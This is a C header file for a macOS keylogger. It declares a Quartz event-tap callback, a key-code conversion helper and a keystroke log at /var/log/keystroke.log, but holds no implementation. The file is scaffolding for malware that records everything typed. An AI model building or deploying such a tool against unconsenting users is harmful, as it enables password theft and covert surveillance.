#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

FILE *logfile = NULL;
const char *logfileLocation = "/var/log/keystroke.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int, bool, bool);

#endif